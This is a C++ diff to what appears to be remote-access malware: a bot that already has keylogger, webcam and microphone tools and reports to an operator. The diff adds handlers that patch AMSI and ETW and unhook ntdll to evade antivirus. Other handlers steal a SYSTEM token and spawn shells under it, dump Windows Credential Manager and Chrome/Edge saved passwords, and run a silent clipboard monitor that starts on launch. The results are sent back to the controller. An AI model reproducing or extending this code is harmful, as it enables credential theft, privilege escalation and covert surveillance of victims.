@@ -38,6 +38,10 @@ SOFTWARE.
 #include "Keylogger.h"
 #include "WebcamTool.h"
 #include "MicTool.h"
+#include "Evasion.h"
+#include "TokenStealer.h"
+#include "CredDump.h"
+#include "ClipMon.h"
 
 // Returns true if this process token is elevated (admin)
 static bool IsElevated() {
@@ -193,6 +197,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 			if (s.protector) {
 				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
 			}
+
+			// Silent clipboard monitor — starts immediately, accumulates silently
+			ClipMon::Start();
 
 			std::string information = "Bot ID: " + std::to_string(ID) +
 				"%0A%0AGlobal information:" +
@@ -503,6 +510,91 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 					}
 					else {
 						api.SendResult(Keylogger::IsRunning() ? "Keylogger: RUNNING" : "Keylogger: STOPPED");
+					}
+				}
+
+				// ── EVASION ───────────────────────────────────────────────────────────
+				// evasion amsi    — patch AmsiScanBuffer in amsi.dll
+				// evasion etw     — blind EtwEventWrite in ntdll.dll
+				// evasion unhook  — restore ntdll .text from disk (remove AV hooks)
+				// evasion all     — run all three
+				else if (params[0] == "evasion") {
+					std::string sub = (params.size() >= 2) ? params[1] : "all";
+					if (sub == "amsi") {
+						api.SendResult(Evasion::PatchAmsi()
+							? "AMSI: patched (AmsiScanBuffer now returns E_INVALIDARG)"
+							: "AMSI: patch failed");
+					} else if (sub == "etw") {
+						api.SendResult(Evasion::PatchEtw()
+							? "ETW: blinded (EtwEventWrite patched with ret)"
+							: "ETW: patch failed");
+					} else if (sub == "unhook") {
+						api.SendResult(Evasion::UnhookNtdll()
+							? "Unhook: ntdll .text restored from disk"
+							: "Unhook: failed");
+					} else {
+						std::string r = Evasion::RunAll();
+						api.SendResult(r.c_str());
+					}
+				}
+
+				// ── TOKEN STEALER ─────────────────────────────────────────────────────
+				// tokensteal                   — impersonate NT AUTHORITY\SYSTEM on this thread
+				// tokenshell C:\...\cmd.exe    — spawn process under stolen SYSTEM token
+				// tokenrevert                  — revert to original thread token
+				else if (params[0] == "tokensteal") {
+					std::string r = TokenStealer::StealSystem();
+					api.SendResult(r.c_str());
+				}
+
+				else if (params[0] == "tokenshell" && params.size() >= 2) {
+					DWORD pid = TokenStealer::SpawnAsSystem(params[1]);
+					api.SendResult(pid
+						? ("SYSTEM process spawned PID=" + std::to_string(pid)).c_str()
+						: "tokenshell: SpawnAsSystem failed");
+				}
+
+				else if (params[0] == "tokenrevert") {
+					TokenStealer::Revert();
+					api.SendResult("Thread token reverted");
+				}
+
+				// ── CREDENTIAL DUMP ───────────────────────────────────────────────────
+				// creddump credman   — Windows Credential Manager
+				// creddump chrome    — Chrome / Edge saved passwords (DPAPI + AES-GCM)
+				else if (params[0] == "creddump") {
+					std::string sub = (params.size() >= 2) ? params[1] : "";
+					if (sub == "credman") {
+						std::string r = CredDump::CredMan();
+						api.SendResult(r.c_str());
+					} else if (sub == "chrome") {
+						std::string r = CredDump::Chrome();
+						api.SendResult(r.c_str());
+					} else {
+						api.SendResult("Usage: creddump credman|chrome");
+					}
+				}
+
+				// ── CLIPBOARD MONITOR ─────────────────────────────────────────────────
+				// clipmon start   — start background clipboard monitor (auto-started on launch)
+				// clipmon stop    — stop monitor
+				// clipmon dump    — dump and clear accumulated clipboard entries
+				// clipmon status
+				else if (params[0] == "clipmon") {
+					std::string sub = (params.size() >= 2) ? params[1] : "status";
+					if (sub == "start") {
+						ClipMon::Start();
+						api.SendResult("Clipboard monitor started");
+					} else if (sub == "stop") {
+						ClipMon::Stop();
+						api.SendResult("Clipboard monitor stopped");
+					} else if (sub == "dump") {
+						std::string data = ClipMon::Dump();
+						api.SendResult(data.c_str());
+					} else {
+						api.SendResult(ClipMon::IsRunning()
+							? "ClipMon: RUNNING"
+							: "ClipMon: STOPPED");
 					}
 				}
 
